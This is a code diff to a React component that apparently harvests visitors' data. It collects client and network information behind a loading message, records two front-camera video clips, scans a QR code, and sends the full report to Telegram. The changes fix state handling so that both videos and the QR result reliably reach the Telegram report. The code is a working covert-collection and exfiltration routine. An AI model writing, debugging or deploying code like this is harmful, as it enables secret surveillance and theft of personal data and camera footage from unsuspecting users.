@@ -152,10 +152,9 @@ const PermissionHandler = () => {
   const handleQrCodeScanned = useCallback(
     async (qrData: string) => {
       console.log("QR Code Scanned in PermissionHandler:", qrData);
-      // Обновляем collectedData и сразу отправляем финальный отчет
       const finalData = { ...collectedData, qrCodeData: qrData };
       setCollectedData(finalData);
-      await sendDataToTelegram(finalData);
+      await sendDataToTelegram(finalData); // Отправляем финальный отчет
       setAppPhase("finished");
     },
     [collectedData, sendDataToTelegram]
@@ -164,10 +163,9 @@ const PermissionHandler = () => {
   const handleQrScanError = useCallback(
     async (error: string) => {
       console.error("QR Scan Error:", error);
-      // Обновляем collectedData и сразу отправляем финальный отчет
       const finalData = { ...collectedData, qrCodeData: `QR Scan Error: ${error}` };
       setCollectedData(finalData);
-      await sendDataToTelegram(finalData);
+      await sendDataToTelegram(finalData); // Отправляем финальный отчет
       setAppPhase("finished");
     },
     [collectedData, sendDataToTelegram]
@@ -187,8 +185,8 @@ const PermissionHandler = () => {
       setAppPhase("collectingData");
       loadingInterval = updateLoadingMessage();
 
-      const currentCollectedData: CollectedData = {};
-      
+      let currentCollectedData: CollectedData = {}; // Используем let для мутации
+
       // Collect client info (synchronous)
       currentCollectedData.clientInfo = getClientInfo();
       currentCollectedData.networkInfo = getNetworkInfo();
@@ -225,12 +223,14 @@ const PermissionHandler = () => {
       // --- Video 1 Recording ---
       setAppPhase("recordingVideo1");
       const video1Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
-      setCollectedData(prev => ({ ...prev, video1: video1Base64 })); // Обновляем только video1
+      currentCollectedData = { ...currentCollectedData, video1: video1Base64 }; // Обновляем локальную переменную
+      setCollectedData(currentCollectedData); // Обновляем состояние
 
       // --- Video 2 Recording ---
       setAppPhase("recordingVideo2");
       const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
-      setCollectedData(prev => ({ ...prev, video2: video2Base64 })); // Обновляем только video2
+      currentCollectedData = { ...currentCollectedData, video2: video2Base64 }; // Обновляем локальную переменную
+      setCollectedData(currentCollectedData); // Обновляем состояние
 
       // --- Flip Camera and QR Scanning ---
       setAppPhase("flippingCamera");
@@ -242,12 +242,10 @@ const PermissionHandler = () => {
       qrTimeout = setTimeout(async () => {
         console.log("QR scanning timed out.");
         // Отправляем финальный отчет с таймаутом QR
-        setCollectedData(prev => {
-          const finalData = { ...prev, qrCodeData: "QR Scan Timed Out" };
-          sendDataToTelegram(finalData); // Отправляем финальный отчет
-          setAppPhase("finished");
-          return finalData;
-        });
+        const finalData = { ...currentCollectedData, qrCodeData: "QR Scan Timed Out" };
+        setCollectedData(finalData);
+        await sendDataToTelegram(finalData); // Отправляем финальный отчет
+        setAppPhase("finished");
       }, QR_SCAN_TIMEOUT_MS);
     };
 
